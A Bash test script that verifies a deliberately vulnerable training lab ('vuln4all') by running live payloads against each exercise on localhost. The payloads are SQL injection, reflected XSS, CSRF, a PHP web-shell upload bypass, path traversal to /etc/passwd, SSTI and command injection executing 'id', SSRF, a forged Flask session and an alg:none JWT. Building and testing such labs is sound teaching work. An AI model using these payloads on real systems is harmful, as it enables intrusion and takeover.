#!/usr/bin/env bash
# vuln4all 端到端验证：起靶场 → 用 curl 把每道题真打一遍 → 收尾。
#
# 只在隔离环境（本地虚拟机 / 专用测试机）里跑。这个脚本会真的把每道题的
# 漏洞打通一遍，并且会在最后把 workspace/ 全部重置。
#
#   bash tools/verify.sh
#   PORT=9000 bash tools/verify.sh

set -u

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$ROOT" || exit 1

PORT="${PORT:-8800}"
BASE="http://127.0.0.1:${PORT}"
PIDFILE="/tmp/v4a-verify.pid"
LOG="/tmp/v4a-verify.log"
JAR="/tmp/v4a-verify.cookies"
rm -f "$JAR"

PASS=0
FAIL=0

ok()   { PASS=$((PASS + 1)); printf '  \033[32mPASS\033[0m  %s\n' "$1"; }
bad()  { FAIL=$((FAIL + 1)); printf '  \033[31mFAIL\033[0m  %s\n' "$1"; }
step() { printf '\n\033[1m%s\033[0m\n' "$1"; }

has() { case "$2" in *"$1"*) return 0 ;; *) return 1 ;; esac; }

expect_has()  { if has "$2" "$3"; then ok "$1"; else bad "$1（返回体里找不到 [$2]）"; fi; }
expect_no()   { if has "$2" "$3"; then bad "$1（不该出现 [$2]，却出现了）"; else ok "$1"; fi; }
expect_code() { if [ "$2" = "$3" ]; then ok "$1"; else bad "$1（期望 HTTP $3，实际 $2）"; fi; }

# 题目页里自带「提示 / 答案」折叠区，里面有解题文本。做内容断言之前必须把它剥掉 ——
# 否则随便挑一个字符串都能在答案里找到，测试就会变成「永远通过」的假阳性。
# 这个坑真的踩过一次：`uid=` 在答案里就有，于是失败的反倒"通过"了。
strip_teaching() {
  python3 -c '
import re, sys
html = sys.stdin.read()
# 只剥 core 外壳里的教学折叠区。约定：模块自己的模板不要用 <details>
# 承载测试要断言的内容 —— 否则会被一起剥掉。
print(re.sub(r"<details\b.*?</details>", "", html, flags=re.S))
'
}

# 抓一个页面，并且把教学文本剥掉
page() { curl -s "$@" | strip_teaching; }

cleanup() {
  if [ -f "$PIDFILE" ]; then
    pid=$(cat "$PIDFILE")
    # 杀之前核对命令行，只杀本脚本自己起的那个进程
    if [ -r "/proc/$pid/cmdline" ] && tr '\0' ' ' <"/proc/$pid/cmdline" | grep -q "vuln4all"; then
      kill "$pid" 2>/dev/null
      sleep 1
      kill -9 "$pid" 2>/dev/null
      echo "  已停掉靶场进程 $pid"
    else
      echo "  PID $pid 的命令行对不上，没动它"
    fi
    rm -f "$PIDFILE"
  fi
}
trap cleanup EXIT

step "0. 起靶场"

# 先把自己上一次留下的残局收掉（上一次被 kill -9 时 trap 不会跑）。
# 这一步要在端口检查之前：否则自己留的进程会被当成"别人占着端口"而硬失败。
if [ -f "$PIDFILE" ] && kill -0 "$(cat "$PIDFILE")" 2>/dev/null; then
  echo "  端口上已经有本脚本起的进程，先停掉"
  cleanup
fi

# 端口上如果另有其人，直接停下 —— 否则 curl 会去问那个"别人"，
# 而我们拿它的返回体做断言，跑出一堆跟本次改动无关的假结论。
# 这种事真的发生过一次：旧服务占着 8800，新进程绑不上就死了，
# 结果 16 项全红，看着像代码坏了，其实是测错了对象。
if command -v ss >/dev/null 2>&1; then
  if ss -ltn 2>/dev/null | grep -qE ":$PORT([[:space:]]|$)"; then
    bad "端口 $PORT 已经被占了，先清掉再来。占用者："
    ss -ltnp 2>/dev/null | grep -E ":$PORT([[:space:]]|$)" || true
    exit 1
  fi
else
  echo "  警告：这台机器上没有 ss，没法检查 $PORT 是否已被占用"
  echo "        如果端口上恰好有别的东西在应答，本次结果不可信"
fi

nohup python3 -m vuln4all run --port "$PORT" >"$LOG" 2>&1 &
echo $! >"$PIDFILE"
SERVERPID=$(cat "$PIDFILE")

for _ in $(seq 1 40); do
  curl -s -o /dev/null "$BASE/" && break
  sleep 0.25
done

if ! curl -s -o /dev/null "$BASE/"; then
  bad "靶场起不来，看 $LOG"
  tail -30 "$LOG"
  exit 1
fi

# 确认应答的确实是我们刚起的那个进程，而不是端口上捡来的别人
if ! kill -0 "$SERVERPID" 2>/dev/null; then
  bad "我们起的进程 $SERVERPID 已经死了，但 $PORT 上有人在应答 —— 说明在测别人"
  exit 1
fi
if [ -r "/proc/$SERVERPID/cmdline" ]; then
  if ! tr '\0' ' ' <"/proc/$SERVERPID/cmdline" | grep -q "vuln4all"; then
    bad "PID $SERVERPID 的命令行对不上，不敢往它上面做断言"
    exit 1
  fi
else
  echo "  警告：读不到 /proc/$SERVERPID/cmdline（挂载了 hidepid？），跳过命令行核对"
fi

# 再确认一下拿到的是本项目的页面，而不是同端口上的另一个服务
if ! curl -s "$BASE/" | grep -q "vuln4all"; then
  bad "$PORT 上应答的东西不是 vuln4all"
  exit 1
fi

ok "靶场起来了（pid $SERVERPID，日志 $LOG）"

step "1. 清单页与体检页"
body=$(curl -s "$BASE/")
expect_has "清单页列出 sqli"   "登录处的 SQL 注入" "$body"
expect_has "清单页列出 csrf"   "改密码处的 CSRF" "$body"
expect_has "清单页列出 xss"    "搜索框的反射型 XSS" "$body"
expect_has "清单页列出 idor"   "改个数字看别人的订单" "$body"
expect_has "清单页列出 upload" "上传头像处的文件类型绕过" "$body"
expect_has "清单页露出攻击者站点入口" "/evil-site/" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' "$BASE/__vuln4all/status")
expect_code "体检页可访问" "$code" "200"

step "1b. 前端"
body=$(curl -s "$BASE/")
expect_has "清单页有搜索框"          'id="v4a-search"' "$body"
expect_has "清单页有分类筛选按钮"    'class="chip' "$body"
expect_has "清单页有分类区块"        'class="cat"' "$body"
expect_has "清单页有难度筛选"        'id="v4a-diffs"' "$body"
expect_has "难度标签上了色"          'badge-diff-easy' "$body"
expect_has "页脚标了作者"            "guaidao2" "$body"

body=$(curl -s "$BASE/v/sqli/login_bypass/")
expect_has "题目页有标题卡片"        'class="hero-card"' "$body"
expect_has "题目页有提示折叠区"      "提示" "$body"
expect_has "题目页有答案折叠区"      "答案" "$body"
expect_has "题目页标了出题人"        "guaidao2" "$body"
expect_has "题目页有重置按钮"        "重置这题" "$body"

css=$(curl -s -w '\n%{http_code}' "$BASE/__vuln4all/static/style.css")
expect_has "样式表内容有新设计令牌"  "--accent" "$css"
expect_has "样式表里带上了 HTTP 状态" "200" "$css"
# 筛选 JS 靠 element.hidden 收卡片；作者来源的 .card{display:flex} 会压过
# UA 的 [hidden]{display:none}，所以样式表里必须显式重申一次
expect_has "样式表里有 [hidden] 兜底规则" "[hidden]" "$css"

step "2. SQLi —— 登录绕过"
body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username=admin" --data-urlencode "password=wrong")
expect_has "密码确实错时会报错" "用户名或密码错误" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username=admin' --" --data-urlencode "password=whatever")
expect_code "admin' --  被接受（302）" "$code" "302"

body=$(curl -s -b "$JAR" "$BASE/v/sqli/login_bypass/welcome")
expect_has "拿到 admin 身份，判定通关" "这题通了" "$body"
rm -f "$JAR"

body=$(curl -s -X POST "$BASE/v/sqli/login_bypass/" \
  --data-urlencode "username='" --data-urlencode "password=x")
expect_has "单个单引号触发报错回显" "数据库报错" "$body"

step "3. XSS —— 反射"
body=$(curl -s "$BASE/v/xss/reflect_search/?q=%3Cb%3Ehello%3C%2Fb%3E")
expect_has "无害标签被当成标签解析" "<b>hello</b>" "$body"

body=$(curl -s --get "$BASE/v/xss/reflect_search/" \
  --data-urlencode 'q=<script>alert(document.cookie)</script>')
expect_has "script 标签原样出现在 HTML 里" "<script>alert(document.cookie)</script>" "$body"

body=$(curl -s --get "$BASE/v/xss/reflect_search/" \
  --data-urlencode 'q=<img src=x onerror=alert(1)>')
expect_has "img onerror 载荷原样出现" "onerror=alert(1)" "$body"

step "4. IDOR —— 换个订单号"
curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/order_detail/login" \
  --data-urlencode "username=alice" --data-urlencode "password=alice123"
body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/orders")
expect_has "alice 看得到自己的订单" "机械键盘" "$body"
expect_no "alice 的列表里没有 bob 的订单" "礼品卡" "$body"

body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/order/1001")
expect_has "看自己的订单是正常的" "这是你自己的订单" "$body"

body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/order/1003")
expect_has "改个数字就看到 bob 的订单" "别人的订单" "$body"
expect_has "越权页判定通关" "这题通了" "$body"
expect_has "泄露了 bob 的私密备注" "别外传" "$body"
rm -f "$JAR"

step "5. CSRF —— 带着受害者的 cookie 改密码"
curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123"
body=$(curl -s -b "$JAR" "$BASE/v/csrf/password_change/profile")
expect_has "bob 登录成功进到个人中心" "员工个人中心" "$body"
expect_no "改密码表单里没有 CSRF token" 'name="csrf"' "$body"

body=$(curl -s "$BASE/evil-site/")
expect_has "攻击者站点可达" "恭喜你中奖" "$body"
expect_has "攻击者站点指向受害者站的接口" "/v/csrf/password_change/change-password" "$body"

# 关键一步：带着 bob 的 session cookie，但从「攻击者」那边发起
code=$(curl -s -o /dev/null -w '%{http_code}' -b "$JAR" -X POST \
  "$BASE/v/csrf/password_change/change-password" \
  --data-urlencode "new_password=pwned-by-csrf")
expect_code "改密码请求被接受（服务端不看来源）" "$code" "302"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123")
expect_code "旧密码已经不好使了" "$code" "200"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=pwned-by-csrf")
expect_code "被 CSRF 改掉的新密码能登进去" "$code" "302"
rm -f "$JAR"

step "6. 上传 —— 后缀与 Content-Type 绕过"
printf '<?php system($_GET[0]); ?>' >/tmp/v4a-shell.php

code=$(curl -s -o /tmp/v4a-up1.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.php;type=image/png' \
  "$BASE/v/upload/avatar/upload")
expect_code "原样 .php 被黑名单拦下（400）" "$code" "400"

code=$(curl -s -o /tmp/v4a-up2.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.PHp;type=application/octet-stream' \
  "$BASE/v/upload/avatar/upload")
expect_code "只改大小写，被 Content-Type 拦下（400）" "$code" "400"
expect_has "被拦时页面回显了客户端声明的 Content-Type" "application/octet-stream" "$(cat /tmp/v4a-up2.html)"

code=$(curl -s -o /tmp/v4a-up3.html -w '%{http_code}' -X POST \
  -F 'avatar=@/tmp/v4a-shell.php;filename=shell.PHp;type=image/png' \
  "$BASE/v/upload/avatar/upload")
expect_code "两处一起绕过 —— 上传成功（200）" "$code" "200"
body=$(cat /tmp/v4a-up3.html)
expect_has "页面判定绕过成功" "绕过去了" "$body"
expect_has "页面点明通关" "这题通了" "$body"

body=$(curl -s "$BASE/v/upload/avatar/uploads/shell.PHp")
expect_has "落地的文件能被直接访问到" '<?php system' "$body"

step "7. reset —— 恢复出厂"
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=csrf/password_change")
expect_code "页面上的重置按钮生效（303）" "$code" "303"

rm -f "$JAR"
code=$(curl -s -o /dev/null -w '%{http_code}' -c "$JAR" -X POST \
  "$BASE/v/csrf/password_change/login" \
  --data-urlencode "username=bob" --data-urlencode "password=password123")
expect_code "重置后 bob 的密码复原了" "$code" "302"
rm -f "$JAR"

curl -s -o /dev/null -c "$JAR" -X POST "$BASE/v/idor/order_detail/login" \
  --data-urlencode "username=alice" --data-urlencode "password=alice123"
body=$(curl -s -b "$JAR" "$BASE/v/idor/order_detail/orders")
expect_has "只重置了一题，别的题的数据没被动" "机械键盘" "$body"
rm -f "$JAR"

code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=*")
expect_code "重置全部（303）" "$code" "303"

body=$(curl -s "$BASE/v/upload/avatar/")
expect_no "重置全部后上传的文件被清掉了" "shell.PHp" "$body"

# 浏览器发起的跨站重置应该被拒（curl 不带 Origin，所以上面那些不受影响）
code=$(curl -s -o /dev/null -w '%{http_code}' -X POST "$BASE/__vuln4all/reset" \
  -H "Origin: http://evil.example" --data-urlencode "id=*")
expect_code "跨站来的重置请求被拒（403）" "$code" "403"

# 开放重定向：反斜杠变体
loc=$(curl -s -o /dev/null -w '%{redirect_url}' -X POST "$BASE/__vuln4all/reset" \
  --data-urlencode "id=sqli/login_bypass" --data-urlencode 'next=/\evil.example')
case "$loc" in
  *evil.example*) bad "next=/\evil.example 被放行了（开放重定向）：$loc" ;;
  *)              ok  "反斜杠变体的 next 被吃掉了" ;;
esac

rm -f /tmp/v4a-shell.php /tmp/v4a-up1.html /tmp/v4a-up2.html /tmp/v4a-up3.html "$JAR"

step "8. 命令行"
out=$(python3 -m vuln4all list)
expect_has "list 认得所有分类" "[upload]" "$out"

out=$(python3 -m vuln4all doctor 2>&1)
ec=$?
expect_no "doctor 不再把 templates/ 误报成缺 module.py" "templates 这个目录下" "$out"
expect_no "doctor 不再提 __pycache__" "__pycache__" "$out"
if [ "$ec" = "0" ]; then ok "doctor 退出码是 0"; else bad "doctor 退出码是 $ec"; fi

step "8b. main.py 主入口"
out=$(python3 main.py list)
expect_has "main.py list 能用" "[upload]" "$out"

out=$(python3 main.py doctor 2>&1)
if [ "$?" = "0" ]; then ok "main.py doctor 退出码是 0"; else bad "main.py doctor 退出码非 0"; fi

# 不带子命令直接跑 main.py，应该就是启动靶场。
# 端口从 $PORT 派生，并且和主流程一样先确认没人占着 ——
# 否则一个被占的端口会报成"期望 200，实际 000"，指向完全错误的方向。
PORT2=$((PORT + 4))
if command -v ss >/dev/null 2>&1 && ss -ltn 2>/dev/null | grep -qE ":$PORT2([[:space:]]|$)"; then
  bad "端口 $PORT2 被占了，跳过 main.py 起服务这一项"
else
  nohup python3 main.py --port "$PORT2" >/tmp/v4a-main.log 2>&1 &
  MAINPID=$!
  for _ in $(seq 1 40); do
    curl -s -o /dev/null "http://127.0.0.1:$PORT2/" && break
    sleep 0.25
  done
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://127.0.0.1:$PORT2/")
  expect_code "python3 main.py 不带子命令就起了靶场" "$code" "200"
  body=$(curl -s "http://127.0.0.1:$PORT2/")
  expect_has "main.py 起的靶场清单页正常" "登录处的 SQL 注入" "$body"

  if [ -r "/proc/$MAINPID/cmdline" ] && tr '\0' ' ' <"/proc/$MAINPID/cmdline" | grep -q "main.py"; then
    kill "$MAINPID" 2>/dev/null
    sleep 1
    kill -9 "$MAINPID" 2>/dev/null
  fi
fi

# 全局选项写在子命令前面也要能走通（这条以前会被误当前置成 run）
out=$(python3 main.py --home "$ROOT" list)
expect_has "main.py --home X list 能走通" "[upload]" "$out"

step "9. core 契约加固（在 /tmp 的副本里做，不动真靶场）"
LAB=/tmp/v4a-hardening
rm -rf "$LAB"
mkdir -p "$LAB"
cp -r "$ROOT/vuln4all" "$ROOT/modules" "$LAB/"

cd "$LAB" || exit 1

# ---- 9a 归一化撞名：id 里的 - 和 _ 必须能共存（sqli/login_bypass 已存在）
mkdir -p "modules/sqli/login-bypass"
cat >"modules/sqli/login-bypass/module.py" <<'PY'
"""对照组：这个 id 用连字符，必须和 modules/sqli/login_bypass 各自独立。"""
from vuln4all import Vuln


class DashVariant(Vuln):
    info = {
        "name": "连字符对照组",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "用来验证归一化撞名已经修掉。",
        "hint": "-",
        "solution": "-",
    }

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        @app.route("/")
        def index():
            return "dash-variant"

        return {"": app}
PY

# ---- 9b 抢占 core 的保留前缀
mkdir -p "modules/zztest/reserved_path"
cat >"modules/zztest/reserved_path/module.py" <<'PY'
"""这个模块想把 core 的体检页抢过来，应该被摘掉。"""
from vuln4all import Vuln


class StealStatus(Vuln):
    info = {
        "name": "抢体检页",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被拒绝。",
        "hint": "-",
        "solution": "-",
        "mounts": {"evil": {"path": "/__vuln4all/status"}},
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        evil = ctx.flask(__name__, mount="evil")

        @main.route("/")
        def index():
            return "main"

        @evil.route("/")
        def hijack():
            return "HijackedStatus"

        return {"": main, "evil": evil}
PY

# ---- 9c 抢占已经被别的模块占了的挂载点
mkdir -p "modules/zztest/steal_evil"
cat >"modules/zztest/steal_evil/module.py" <<'PY'
"""这个模块想挂到 /evil-site，但那个位置是 csrf/password_change 的。"""
from vuln4all import Vuln


class StealEvil(Vuln):
    info = {
        "name": "抢别人的挂载点",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被拒绝。",
        "hint": "-",
        "solution": "-",
        "mounts": {"steal": {"path": "/evil-site"}},
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        steal = ctx.flask(__name__, mount="steal")

        @main.route("/")
        def index():
            return "main"

        @steal.route("/")
        def taken():
            return "StolenEvilSite"

        return {"": main, "steal": steal}
PY

# ---- 9d 多挂载点忘了传 mount=：两個 app 会用同一个 session cookie
mkdir -p "modules/zztest/forgot_mount"
cat >"modules/zztest/forgot_mount/module.py" <<'PY'
"""第二个 app 故意不传 mount=，doctor 应该抓出来。"""
from vuln4all import Vuln


class ForgotMount(Vuln):
    info = {
        "name": "忘了传 mount",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被检查出来。",
        "hint": "-",
        "solution": "-",
    }

    def create_app(self, ctx):
        main = ctx.flask(__name__)
        second = ctx.flask(__name__)  # <- 忘了 mount="second"

        @main.route("/")
        def index():
            return "main"

        @second.route("/")
        def other():
            return "second"

        return {"": main, "second": second}
PY

# ---- 9e 主挂载点被抢：这时 entry.error 会被置上，doctor 必须还能说出是被谁抢的
mkdir -p "modules/zztest/main_conflict"
cat >"modules/zztest/main_conflict/module.py" <<'PY'
"""主挂载点被别人占了 —— 报错信息里必须说清是被谁占的。"""
from vuln4all import Vuln


class MainConflict(Vuln):
    info = {
        "name": "主挂载点被占",
        "author": ["x"],
        "cwe": "CWE-0",
        "owasp": "-",
        "description": "应该被判失败，而且要报出被谁占了。",
        "hint": "-",
        "solution": "-",
        "mounts": {"": {"path": "/evil-site"}},
    }

    def create_app(self, ctx):
        app = ctx.flask(__name__)

        @app.route("/")
        def index():
            return "main-conflict"

        return {"": app}
PY

out=$(python3 -m vuln4all doctor 2>&1)
expect_has "doctor 认出抢占 core 保留前缀" "撞上了 core 保留前缀" "$out"
expect_has "doctor 认出抢占别的模块的挂载点" "已经被 csrf/password_change 占了" "$out"
expect_has "doctor 认出忘了传 mount=" "mount=" "$out"
expect_has "主挂载点被抢时仍然报得出被谁抢的" "被摘掉了" "$out"

lst=$(python3 -m vuln4all list 2>&1)
expect_has "带连字符的 id 能共存" "sqli/login-bypass" "$lst"
expect_has "带下划线的 id 还在" "sqli/login_bypass" "$lst"

# 真起一次：归一化撞名会让后加载的顶掉先加载的，core 的体检页也会被抢走
nohup python3 -m vuln4all run --port 8803 >/tmp/v4a-lab.log 2>&1 &
LABPID=$!
for _ in $(seq 1 40); do
  curl -s -o /dev/null http://127.0.0.1:8803/ && break
  sleep 0.25
done
body=$(curl -s http://127.0.0.1:8803/__vuln4all/status)
expect_has "core 的体检页没被抢走" "体检" "$body"
expect_no "抢挂载点的模块没盖住 core" "HijackedStatus" "$body"

body=$(curl -s http://127.0.0.1:8803/v/sqli/login-bypass/)
expect_has "连字符那个模块自己跑起来了" "dash-variant" "$body"
body=$(curl -s http://127.0.0.1:8803/v/sqli/login_bypass/)
expect_has "下划线那个模块没被顶掉" "员工登录" "$body"

if [ -r "/proc/$LABPID/cmdline" ] && tr '\0' ' ' <"/proc/$LABPID/cmdline" | grep -q "vuln4all"; then
  kill "$LABPID" 2>/dev/null
  sleep 1
  kill -9 "$LABPID" 2>/dev/null
fi

cd "$ROOT" || exit 1
rm -rf "$LAB"

step "10. 第二批模块（不同难度 / 不同业务场景）"

# ---- path_traversal/file_download —— 企业网盘
body=$(curl -s --get "$BASE/v/path_traversal/file_download/download" \
  --data-urlencode "name=../内部资料/薪资表.csv")
expect_has "路径穿越读到共享目录外的文件" "vuln4all{path_traversal_ok}" "$body"

body=$(curl -s --get "$BASE/v/path_traversal/file_download/download" \
  --data-urlencode "name=/etc/passwd")
expect_has "绝对路径顶掉基准目录（os.path.join 的坑）" "root:" "$body"

code=$(curl -s -o /dev/null -w '%{http_code}' --get \
  "$BASE/v/path_traversal/file_download/download" \
  --data-urlencode "name=/nonexistent-nope")
expect_code "不存在的文件返回 404" "$code" "404"

# ---- ssti/jinja2_profile —— 团队协作 SaaS
body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" --data-urlencode "template={{7*7}}")
expect_has "模板被求值（7*7 -> 49）" "49" "$body"
expect_has "里程碑记录下来了"        "模板被求值" "$body"

body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" --data-urlencode "template={{config}}")
expect_has "config 被渲染出来" "SECRET_KEY" "$body"

body=$(page -X POST "$BASE/v/ssti/jinja2_profile/" \
  --data-urlencode "template={{ cycler.__init__.__globals__.os.popen('id').read() }}")
expect_has "SSTI 拿到命令执行" "uid=" "$body"

# ---- command_injection/ping_tool —— 运维诊断
body=$(page -X POST "$BASE/v/command_injection/ping_tool/" \
  --data-urlencode "host=127.0.0.1; id")
expect_has "命令注入拿到 uid=" "uid=" "$body"
expect_has "页面判定通关"      "这题通了" "$body"

body=$(page -X POST "$BASE/v/command_injection/ping_tool/" \
  --data-urlencode "host=127.0.0.1")
expect_no "正常输入不该出现 uid=" "uid=" "$body"

# ---- ssrf/url_preview —— 聊天链接预览（双挂载点）
IMPLANT="http://img.vuln4all.local@127.0.0.1:${PORT}/internal-admin/"
body=$(page -X POST "$BASE/v/ssrf/url_preview/" --data-urlencode "url=$IMPLANT")
expect_has "SSRF 打到内网管理后台" "内部管理后台" "$body"
expect_has "SSRF 判定通关"        "这题通了" "$body"

body=$(page -X POST "$BASE/v/ssrf/url_preview/" \
  --data-urlencode "url=http://example.com/x.png")
expect_has "白名单确实在拦（不含标记的域名被拒）" "只允许抓取" "$body"

# 过了白名单、但目标不是内网后台 —— 应该抓不到那个标记。
# 这一条是用来证明上面那个 PASS 是"真抓到了"，而不是断言写松了。
body=$(page -X POST "$BASE/v/ssrf/url_preview/" \
  --data-urlencode "url=http://img.vuln4all.local@127.0.0.1:${PORT}/nope")
expect_no "过了白名单但目标不对，抓不到内网内容" "内部管理后台" "$body"

body=$(curl -s "$BASE/")
expect_no "内网后台的路径不出现在清单页上" "/internal-admin" "$body"
expect_has "清单页只提示有这么个隐藏入口" "隐藏入口" "$body"

# ---- flask_session/forged_cookie —— 订阅后台提权
COOKIE=$(
  python3 - <<'PY'
from flask import Flask
from flask.sessions import SecureCookieSessionInterface

app = Flask(__name__)
app.secret_key = "vuln4all-demo-secret"
serializer = SecureCookieSessionInterface().get_signing_serializer(app)
print(serializer.dumps({"user": "mallory", "plan": "enterprise", "admin": True}))
PY
)
if [ -n "$COOKIE" ]; then
  ok "用弱密钥签出了一个 session cookie"
else
  bad "签 cookie 失败"
fi

code=$(curl -s -o /tmp/v4a-forged.html -w '%{http_code}' \
  -b "v4a_flask_session_forged_cookie_main=$COOKIE" \
  "$BASE/v/flask_session/forged_cookie/admin")
expect_code "伪造 cookie 进管理员页（200）" "$code" "200"
expect_has "管理员页判定通关" "这题通了" "$(strip_teaching < /tmp/v4a-forged.html)"

code=$(curl -s -o /dev/null -w '%{http_code}' \
  "$BASE/v/flask_session/forged_cookie/admin")
expect_code "不带 cookie 进不去（403）" "$code" "403"

# ---- race_condition/coupon_redeem —— 限时优惠券并发
body=$(page "$BASE/v/race_condition/coupon_redeem/")
expect_no "并发之前没通关" "这题通了" "$body"

seq 24 | xargs -P24 -I{} curl -s -o /dev/null -X POST \
  "$BASE/v/race_condition/coupon_redeem/redeem"
body=$(page "$BASE/v/race_condition/coupon_redeem/")
expect_has "并发把「每人一次」打破了" "这题通了" "$body"

# ---- jwt/alg_none —— 开放 API 平台
TOKEN=$(
  python3 - <<'PY'
import base64, json

def b64e(raw):
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

head = b64e(json.dumps({"alg": "none", "typ": "JWT"}).encode())
body = b64e(json.dumps({"user": "mallory", "role": "admin"}).encode())
print(head + "." + body + ".")
PY
)
code=$(curl -s -o /tmp/v4a-jwt.html -w '%{http_code}' \
  -H "Authorization: Bearer $TOKEN" "$BASE/v/jwt/alg_none/api/admin/keys")
expect_code "alg:none 的 token 通过了鉴权（200）" "$code" "200"
expect_has "管理员接口判定通关" "这题通了" "$(strip_teaching < /tmp/v4a-jwt.html)"

code=$(curl -s -o /dev/null -w '%{http_code}' \
  "$BASE/v/jwt/alg_none/api/admin/keys")
expect_code "不带 token 进不去（401）" "$code" "401"

rm -f /tmp/v4a-forged.html /tmp/v4a-jwt.html

step "11. 运行配置（局域网 / 配置文件）"

out=$(python3 - <<'PY'
import sys
sys.path.insert(0, ".")
from pathlib import Path
from vuln4all import config

s, notes = config.resolve(Path("."), {"port": 70000})
print("越界端口 ->", s["port"], "有提示" if notes else "没提示")

print("回环识别 ->", [config.is_loopback(x) for x in
      ("127.0.0.1", "localhost.", "[::1]", "::ffff:127.0.0.1", "0.0.0.0")])

print("通配识别 ->", [config.is_wildcard(x) for x in ("0.0.0.0", "::", "127.0.0.1")])
PY
)
expect_has "越界端口退回默认值并给出提示" "越界端口 -> 8800 有提示" "$out"
expect_has "回环识别覆盖尾点/方括号/IPv4映射" "回环识别 -> [True, True, True, True, False]" "$out"
expect_has "通配地址识别" "通配识别 -> [True, True, False]" "$out"

# 配置文件里出现百分号，不能把整个文件丢掉（configparser 默认的 %-插值会）
cat >vuln4all.ini <<'CFG'
[vuln4all]
host = 0.0.0.0
port = 88%20
allow_remote = true
CFG
out=$(python3 - <<'PY'
import sys
sys.path.insert(0, ".")
from pathlib import Path
from vuln4all import config

s, notes = config.resolve(Path("."), {})
print("host ->", s["host"])
print("port ->", s["port"])
print("文件被丢掉了" if any("读 vuln4all.ini 失败" in n for n in notes) else "文件还在")
PY
)
expect_has "配置里的 % 不会连累其他键" "host -> 0.0.0.0" "$out"
expect_has "坏的 port 单独退回默认值" "port -> 8800" "$out"
expect_has "整个配置文件没有被丢掉" "文件还在" "$out"
rm -f vuln4all.ini

# --lan 不该把用户显式指定的 --host 悄悄放大
out=$(python3 - <<'PY'
import argparse, sys
sys.path.insert(0, ".")
from vuln4all.cli import build_parser

parser = build_parser()
for argv in (["run", "--lan"], ["run", "--lan", "--host", "192.168.1.5"]):
    args = parser.parse_args(argv)
    overrides = {k: getattr(args, k) for k in ("host", "port", "reload") if hasattr(args, k)}
    if args.lan and "host" not in overrides:
        overrides["host"] = "0.0.0.0"
    print(argv, "->", overrides.get("host"))
PY
)
expect_has "只给 --lan 时绑所有网卡" "['run', '--lan'] -> 0.0.0.0" "$out"
expect_has "同时给了 --host 时听 --host 的" "--host', '192.168.1.5'] -> 192.168.1.5" "$out"

# --no-reload 能关掉配置文件里的 reload
cat >vuln4all.ini <<'CFG'
[vuln4all]
reload = true
CFG
out=$(python3 - <<'PY'
import sys
sys.path.insert(0, ".")
from pathlib import Path
from vuln4all import config

print("只读 ini ->", config.resolve(Path("."), {})[0]["reload"])
print("--no-reload ->", config.resolve(Path("."), {"reload": False})[0]["reload"])
PY
)
expect_has "配置文件里的 reload 能生效" "只读 ini -> True" "$out"
expect_has "--no-reload 能盖掉它" "--no-reload -> False" "$out"
rm -f vuln4all.ini

step "12. 仓库卫生"
# 代码、模板、文档里不允许出现表情符号。加一条自动检查，免得以后回归。
hygiene=$(python3 - <<'PY'
import pathlib

RANGES = [
    (0x1F300, 0x1FAFF), (0x1F000, 0x1F2FF), (0x2600, 0x27BF),
    (0x2190, 0x21FF), (0x2B00, 0x2BFF), (0xFE0F, 0xFE0F),
    (0x2049, 0x2049), (0x203C, 0x203C), (0x1F1E6, 0x1F1FF),
]
# 这些是正常的中文排版符号，不算表情
ALLOW = set("·—…→←↑↓≥≤×÷°±§¶†‡•‰′″※「」『』【】《》〈〉“”‘’、。，；：？！（）")

def looks_like_emoji(ch):
    if ch in ALLOW:
        return False
    cp = ord(ch)
    return any(lo <= cp <= hi for lo, hi in RANGES)

hits = []
for path in sorted(pathlib.Path(".").rglob("*")):
    if not path.is_file():
        continue
    rel = path.relative_to(".").as_posix()
    if any(part in rel for part in (".git/", "__pycache__/", "workspace/")):
        continue
    try:
        text = path.read_text(encoding="utf-8")
    except (UnicodeDecodeError, OSError):
        continue
    for lineno, line in enumerate(text.splitlines(), 1):
        if any(looks_like_emoji(c) for c in line):
            hits.append("%s:%d" % (rel, lineno))

print("EMOJI_COUNT=%d" % len(hits))
for item in hits[:8]:
    print("  " + item)
PY
)
expect_has "代码和文档里没有表情符号" "EMOJI_COUNT=0" "$hygiene"

step "结果"
printf '  通过 %d 项，失败 %d 项\n' "$PASS" "$FAIL"
if [ "$FAIL" != "0" ]; then
  printf '\n靶场日志尾部：\n'
  tail -40 "$LOG"
  exit 1
fi
exit 0
